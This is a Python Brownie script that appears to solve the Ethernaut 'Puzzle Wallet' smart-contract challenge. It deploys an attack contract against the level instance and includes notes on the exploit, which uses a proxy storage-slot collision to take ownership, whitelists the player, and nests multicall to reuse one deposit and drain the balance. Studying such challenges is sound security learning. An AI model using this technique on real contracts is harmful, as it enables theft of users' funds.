from scripts.helpful_scripts import get_account
from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
from eth_utils import keccak

ETHERNAUT_INSTANCE = "0x5725ef854cf053d6A449D0555DCaEA2FE523C8a2"

PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
GAS_LIMIT = 6000000
VALUE = "0.001 ether"

def initialise(_player, _target):
    print(f"\nplayer address = {_player}")
    print(f"target = {_target}")
    proxy = Contract.from_abi(PuzzleProxy._name, ETHERNAUT_INSTANCE, PuzzleProxy.abi)
    print(f"PuzzleProxy.pendingAdmin() = {proxy.pendingAdmin()}")
    print(f"PuzzleProxy.admin() = {proxy.admin()}")

def contract_total_balance():
     # current balance of PuzzleProxy
    balance = web3.eth.getBalance(ETHERNAUT_INSTANCE)
    balance_eth = web3.fromWei(balance, "ether")
    print(f"\nContract total balance in wei = {balance}\nbalance in ether = {balance_eth}\n")

def print_storage(_player, _target):
    print("\n---------------- START -----------------")
    for i in range(2):
        storage_slot = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, i)
        storage_slot_hex = web3.toHex(storage_slot)
        print(f"storage slot {i}:  {storage_slot_hex}") # slot 0/slot 1 --> (proxy) admin addresses
    player_WL = _target.whitelisted(_player, {"from": _player})
    print(f"Player address on the whitelist: {player_WL}") 
    print("----------------- END ------------------\n")
       
"""
    0x725595ba16e76ed1f6cc1e1b65a88365cc494824  <- admin address at start

    Function to print the following status message:

    ---------------- START -----------------

    Admin address:    {address}     <-- get these addresses by viewing the storage slots
    Owner address:    {address}     
    Address0 WL:      {true/false}  <-- address0 - address that added 0.001 eth (whitelisted)
    Address1 WL:      {true/false}  <-- address1 - player address (not initially whitelisted)
    Address0 balance: {uint}
    Address1 balance: {uint}
    Total balance:    {uint}
    
    ----------------- END ------------------    
"""

def main():

    # initalise player, target etc.    
    player = get_account()
    target = interface.IPuzzleWallet(ETHERNAUT_INSTANCE)
    initialise(player, target)
    
    print_storage(player, target)
            
    attack = Attack24.deploy(ETHERNAUT_INSTANCE, {"from": player, "gas_limit": GAS_LIMIT})

    attack.attack({"from": player, "gas_limit": GAS_LIMIT, "value": VALUE})
    
    print_storage(player, target)

    # 
    
"""
    Notes:

    storage slot 0 has a collision - pendingAdmin and owner share the same slot

    1. set pendingAdmin to player address by calling proposeNewAdmin(player)
            --> this leap frog's having to call init()

    2. now: owner == address(player)

    3. call addToWhiteList(player)

    4. player is now 'white listed'

    5.  --> next we need to empty the contract balance to zero  <--- HARD bit !! 

        5a. we need to: call execute(), with amount >= "0.001 ether" to drain the funds
        5b. however: require(balances[msg.sender] >= value  means that the 0.001 eth needs to be ours
        5c. see "Functionally" (below)
        
        5d. multicall:

        You provide your encoded (encodeWithSelector) calldata, and then it performs the calls for you.

        This section of code prevents us from simply calling deposit say 30 times, in one multicall:

        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }

        

        So, in effect from one invocation of multicall, we can directly call deposit() only once.
        
        We can however perform indirect calls, so if we pass multicall a data array that contains:
            
            1. call deposit()
            2. multicall
                --> call deposit()

        This alows us to deposit twice with one multicall, which in turn unbalances the contract accounting 
        logic, and in turn we are able to drain the contract balance.
        

        

    6. set maxBalance {admin} to player address --> uint256(address(player)) to beat the level  ???

    
    ============================================
    
    Functionally:
    You can't withdraw the total balance, using execute(), due to the combined hurdle of:
     
        1) the contract is pre-loaded with 0.001 ether
        2) you can only withdraw what you put in (which is initially zero)
    
    We need to somehow assign some funds to our balance i.e. balances[msg.sender] such that they are 
    added to our balance, but not the contract balance.  In other words we need to break the accounting
    functionality of the contract (by hacking our balance to inflate it).

    If we can perhaps re-enter deposit(), or call this multiple times for one deposit, we can do it.





"""






 